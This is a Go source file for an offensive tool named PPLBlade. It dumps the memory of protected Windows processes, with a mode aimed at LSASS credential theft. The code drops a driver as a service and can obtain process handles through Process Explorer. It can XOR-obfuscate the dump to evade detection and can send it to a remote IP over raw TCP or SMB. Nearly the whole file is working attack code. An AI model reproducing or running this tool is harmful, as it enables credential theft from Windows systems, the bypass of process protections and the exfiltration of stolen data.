package main

import (
	"flag"
	"fmt"
	"os"
)

const (
	MODE_DECRYPT          = "decrypt"
	MODE_CLEANUP          = "cleanup"
	MODE_DUMP             = "dump"
	MODE_DOTHATLSASSTHING = "dothatlsassthing"
)

const (
	HANDLEMODE_DIRECT  = "direct"
	HANDLEMODE_PROCEXP = "procexp"
)

const (
	DUMPMODE_LOCAL   = "local"
	DUMPMODE_NETWORK = "network"
)

const (
	NETWORKMODE_RAW = "raw"
	NETWORKMODE_SMB = "smb"
)

var HELP = flag.Bool("help", false, "Prints this help message")
var MODE = flag.String("mode", MODE_DUMP, "Kill or Dump process [dump|decrypt|cleanup|dothatlsassthing]")

var SERVICENAME = flag.String("service", "PPLBlade", "Name of the service")
var DRIVERPATH = flag.String("driver", DRIVER_FULL_PATH, "Path where the driver file will be dropped")

var TARGETPID = flag.Int("pid", 0, "PID of target process (prioritized over process name)")
var TARGETPROCNAME = flag.String("name", "", "Process name of target process")

var HANDLEMODE = flag.String("handle", HANDLEMODE_DIRECT, "Method to obtain target process handle [direct|procexp]")

var DUMPMODE = flag.String("dumpmode", DUMPMODE_LOCAL, "Dump mode [local|network]")

var DUMPNAME = flag.String("dumpname", "PPLBlade.dmp", "Name of the dump file")
var DUMPOBF = flag.Bool("obfuscate", false, "Obfuscate dump file")
var OBFKEY = flag.String("key", "PPLBlade", "XOR Key for obfuscation")

var NETWORKMODE = flag.String("network", "raw", "Method for network transfer")
var REMOTEIP = flag.String("ip", "", "IP of the remote server")
var REMOTEPORT = flag.Int("port", 0, "PORT on the remote server")

var SHARE = flag.String("share", "", "share name")
var SMBUSER = flag.String("user", "", "SMB username")
var SMBPASS = flag.String("pass", "", "SMB password")

var QUIET = flag.Bool("quiet", false, "Quiet mode")

func main() {
	flag.Parse()
	if *HELP {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
		return
	}
	FillArguments()
	defer CleanUp(*SERVICENAME, *DRIVERPATH, *HANDLEMODE)
	if *MODE == MODE_CLEANUP {
		return
	}
	if *MODE == MODE_DECRYPT {
		newFileName, err := DeobfuscateDump(*DUMPNAME, *OBFKEY)
		if err != nil {
			LogStatus("Failed to deobfuscate dump file", err, false)
			return
		}
		LogStatus(fmt.Sprintf("Deobfuscated dump saved in file %s", newFileName), nil, true)
		return
	}
	if err := ValidateArguments(); err != nil {
		LogStatus("Failed to validate arguments", err, false)
		return
	}

	if status := SetUp(*MODE, *HANDLEMODE, *SERVICENAME, *DRIVERPATH); !status {
		return
	}

	*TARGETPID = GetProcessId(*TARGETPID, *TARGETPROCNAME)
	if *TARGETPID == 0 {
		LogStatus("Could not open process with PID: 0", nil, false)
		return
	}
	LogStatus(fmt.Sprintf("Targeting process with PID: %d", *TARGETPID), nil, true)
	hProc, err := OpenProcessHandle(*TARGETPID, *HANDLEMODE)
	if err != nil {
		LogStatus(fmt.Sprintf("Failed to obtain process handle. Method: %s. PID: %d", *HANDLEMODE, *TARGETPID), err, false)
		return
	}
	LogStatus(fmt.Sprintf("Obtained process handle: %v", hProc), nil, true)

	if *MODE == MODE_DUMP || *MODE == MODE_DOTHATLSASSTHING {
		LogStatus("Attempting to dump process", nil, true)
		if err = MiniDumpGetBytes(*hProc); err != nil {
			LogStatus("Failed to dump process memory", err, false)
			return
		}
		LogStatus("Process memory dumped successfully", nil, true)
		if *DUMPOBF {
			LogStatus("Obfuscating memory dump", nil, true)
			xor(&dumpBuffer, []byte(*OBFKEY))
		}
		if *DUMPMODE == DUMPMODE_LOCAL {
			dumpFile, err := os.Create(*DUMPNAME)
			if err != nil {
				LogStatus("Failed to create dump file", err, false)
				return
			}
			if _, err = dumpFile.Write(dumpBuffer); err != nil {
				LogStatus("Failed to write into dump file", err, false)
				return
			}
			LogStatus(fmt.Sprintf("Dump saved in file %s", *DUMPNAME), nil, true)
			return
		}
		if *NETWORKMODE == NETWORKMODE_RAW {
			if err = SendBytesRaw(*REMOTEIP, *REMOTEPORT); err != nil {
				LogStatus(fmt.Sprintf("Failed to send bytes at %s:%d. Protocol: %s", *REMOTEIP, *REMOTEPORT, *NETWORKMODE), err, false)
				return
			}
			LogStatus(fmt.Sprintf("Dump bytes sent at %s:%d. Protocol: %s", *REMOTEIP, *REMOTEPORT, *NETWORKMODE), nil, true)
			return
		}
		if err = SendBytesSMB(*REMOTEIP, *SMBUSER, *SMBPASS, *SHARE, *DUMPNAME); err != nil {
			LogStatus(fmt.Sprintf("Failed to send bytes at %s:%d. Protocol: %s", *REMOTEIP, *REMOTEPORT, *NETWORKMODE), err, false)
			return
		}
		LogStatus(fmt.Sprintf("Dump bytes sent at %s:%d. Protocol: %s", *REMOTEIP, *REMOTEPORT, *NETWORKMODE), nil, true)
		return
	}

}
